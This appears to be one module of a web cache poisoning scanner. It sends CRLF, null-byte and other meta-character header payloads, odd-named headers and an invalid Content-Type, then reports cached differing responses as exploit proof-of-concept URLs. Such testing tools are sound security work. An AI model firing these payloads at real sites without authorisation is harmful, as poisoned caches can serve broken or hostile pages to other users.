import random
import string
from core.cache import extract_cache_headers
import core.config

class HMCAttack:
    name = "Unexpected Header Values"

    def run(self, ctx):
        ctx.log.debug(f"Testing for {self.name}")

        vuln = False

        # Meta chars
        payloads = [
            "BadChars\\n\\r",
            "BadChars%0A%0D",
            "BadChars\x00",
            "BadChars\t",
        ]

        for p in payloads:
            headers = ctx.headers.copy()
            headers["X-Meta-Header"] = p

            resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

            if resp is None:
                continue

            if ctx.is_different(resp):
                if extract_cache_headers(resp):
                    ctx.log.vuln(f"X-Meta-Header: {p} | Exploit PoC: {ctx.url}?{cb}")
                    
                    if core.config.open_browser:
                        import webbrowser
                        webbrowser.open_new_tab(f"{ctx.url}?{cb}")

                    vuln = True

        # Weird headers
        special_chars = [
            "!", "#", "$", "%", "&", "'", "*", "+", "-", ".", "^", "_", "`", "|", "~"
        ]

        # add dynamic ones
        special_chars.append(str(random.randint(0, 9)))  # random_digit
        special_chars.append(random.choice(string.ascii_letters))  # random_character

        for ch in special_chars:
            headers = ctx.headers.copy()

            headers[ch] = "1"

            resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

            if resp and ctx.is_different(resp):
                if extract_cache_headers(resp):
                    _, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)
                    ctx.log.vuln(f"Unexpected header valuer '{ch}:1' | Exploit PoC: {ctx.url}?{cb}")

                    if core.config.open_browser:
                        import webbrowser
                        webbrowser.open_new_tab(f"{ctx.url}?{cb}")
                    vuln = True

        # Invalid content-type
        headers = ctx.headers.copy()
        headers["Content-Type"] = "HelloWorld"

        resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

        if resp and ctx.is_different(resp):
            if extract_cache_headers(resp):
                _, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)
                ctx.log.vuln(f"Invalid Content-Type | Exploit PoC: {ctx.url}?{cb}")

                if core.config.open_browser:
                    import webbrowser
                    webbrowser.open_new_tab(f"{ctx.url}?{cb}")
                vuln = True

        if not vuln:
            ctx.log.error("Not vulnerable")